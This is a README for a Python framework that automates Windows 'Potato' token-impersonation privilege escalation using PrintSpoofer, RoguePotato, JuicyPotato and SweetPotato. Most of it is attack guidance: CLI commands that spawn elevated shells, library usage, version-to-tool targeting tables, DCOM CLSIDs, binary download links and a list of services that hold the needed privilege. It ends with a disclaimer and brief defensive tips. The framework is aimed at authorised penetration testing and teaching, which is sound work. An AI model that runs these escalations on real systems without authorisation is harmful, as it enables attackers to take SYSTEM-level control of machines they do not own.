# Token Impersonation Framework

A modular Python framework for Windows Potato-style privilege escalation attacks using token impersonation techniques.

## ⚠️ Legal Disclaimer

This tool is intended for authorized penetration testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Overview

The Token Impersonation Framework provides automated exploitation of Windows token impersonation vulnerabilities using "Potato" techniques:

- **PrintSpoofer**: Abuses Print Spooler named pipe impersonation
- **RoguePotato**: Remote DCOM relay impersonation
- **JuicyPotato**: BITS-based DCOM impersonation (legacy systems)
- **SweetPotato**: Multi-technique Potato exploitation

## Directory Structure

```
token_impersonation_framework/
├── __init__.py              # Package initialization
├── token_impersonate.py     # Main CLI entry point
├── README.md                # This file
│
├── core/                    # Core functionality
│   ├── __init__.py
│   ├── base.py              # Abstract base class for exploits
│   ├── privileges.py        # Privilege checking module
│   └── detector.py          # System detection and recommendations
│
├── exploits/                # Individual exploit modules
│   ├── __init__.py
│   ├── printspoofer.py      # PrintSpoofer exploitation
│   ├── roguepotato.py       # RoguePotato exploitation
│   ├── juicypotato.py       # JuicyPotato exploitation
│   └── sweetpotato.py       # SweetPotato exploitation
│
├── utils/                   # Utility functions
│   ├── __init__.py
│   ├── constants.py         # Tool paths, CLSIDs, etc.
│   └── helpers.py           # Helper utilities
│
└── output/                  # Logs and output files
```

## Installation

```bash
# Clone or copy the framework
git clone <repo> rt_token_impersonation_framework
cd rt_token_impersonation_framework

# No additional dependencies required (uses standard library)
```

## Quick Start

### Check Privileges

```bash
python token_impersonate.py --check
```

### Detect System & Get Recommendations

```bash
python token_impersonate.py --detect
```

### Auto-Exploit

```bash
python token_impersonate.py --auto --command "whoami"
```

### Use Specific Method

```bash
# PrintSpoofer (Windows 10 1809+, Server 2019+)
python token_impersonate.py --method printspoofer --command "cmd.exe"

# JuicyPotato (Server 2012/2016, Windows 7/8/10 pre-1809)
python token_impersonate.py --method juicypotato --command "cmd.exe"

# RoguePotato (requires relay server)
python token_impersonate.py --method roguepotato --rhost 192.168.1.100

# SweetPotato (multi-technique)
python token_impersonate.py --method sweetpotato --technique efspotato
```

## Module Usage

### As a Library

```python
from token_impersonation_framework import (
    PrivilegeChecker,
    SystemDetector,
    PrintSpooferExploit,
    JuicyPotatoExploit
)

# Check privileges
checker = PrivilegeChecker()
can_exploit, privs = checker.check_impersonation_privileges()

if can_exploit:
    # Detect best method
    detector = SystemDetector()
    info = detector.detect_system()
    
    # Use recommended tool
    if 'printspoofer' in info.recommended_tools:
        exploit = PrintSpooferExploit()
        success, output = exploit.exploit(command="whoami")
```

## Attack Techniques

### PrintSpoofer
- **Works on**: Windows 10 1809+, Windows 11, Server 2019+
- **Requires**: SeImpersonatePrivilege
- **How it works**: Tricks the Print Spooler service into connecting to a named pipe controlled by the attacker

### RoguePotato
- **Works on**: Windows 10 1809+, Windows 11, Server 2019+
- **Requires**: SeImpersonatePrivilege + External relay
- **How it works**: Forces DCOM to authenticate to an attacker-controlled relay server

### JuicyPotato
- **Works on**: Server 2008-2016, Windows 7/8/10 (pre-1809)
- **Requires**: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- **How it works**: Exploits BITS service DCOM object for token impersonation
- **Note**: PATCHED in Windows 10 1809+ and Server 2019+

### SweetPotato
- **Works on**: Windows 10, Windows 11, Server 2016+
- **Requires**: SeImpersonatePrivilege
- **How it works**: Combines multiple techniques (PrintSpoofer, EfsPotato, WinRM)

## Tool Download

The framework requires external binaries. Download them from:

| Tool | URL |
|------|-----|
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer/releases |
| RoguePotato | https://github.com/antonioCoco/RoguePotato/releases |
| JuicyPotato | https://github.com/ohpe/juicy-potato/releases |
| SweetPotato | https://github.com/CCob/SweetPotato/releases |

Place binaries in `C:\Windows\Temp\` or use `--tool-path` to specify custom location.

## When to Use Each Tool

| Windows Version | Recommended Tool |
|-----------------|------------------|
| Windows 11 | PrintSpoofer, SweetPotato |
| Windows 10 (1809+) | PrintSpoofer, RoguePotato |
| Windows 10 (pre-1809) | JuicyPotato |
| Server 2022 | PrintSpoofer, SweetPotato |
| Server 2019 | PrintSpoofer, RoguePotato |
| Server 2016 | JuicyPotato |
| Server 2012 | JuicyPotato |

## Services with SeImpersonatePrivilege

Common services that have the required privilege:
- IIS Application Pools
- MSSQL Server
- Apache (XAMPP/WAMP)
- Local Service accounts
- Network Service accounts
- SQL Server Agent

## Common CLSIDs (JuicyPotato)

```
BITS:     {4991d34b-80a1-4291-83b6-3328366b9097}
wuauserv: {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
Schedule: {0f87369f-a4e5-4cfc-bd3e-73e6154572dd}
```

Full list: https://github.com/ohpe/juicy-potato/tree/master/CLSID

## Defense Recommendations

1. **Remove unnecessary privileges** from service accounts
2. **Monitor** for named pipe creation and suspicious DCOM activity
3. **Patch systems** to latest Windows versions
4. **Use Protected Users** security group where possible
5. **Implement** application whitelisting

## References

- [MITRE ATT&CK - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
- [PrintSpoofer - itm4n](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [Potatoes - JLAJARA](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [Windows Token Abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

## License

For educational and authorized testing purposes only.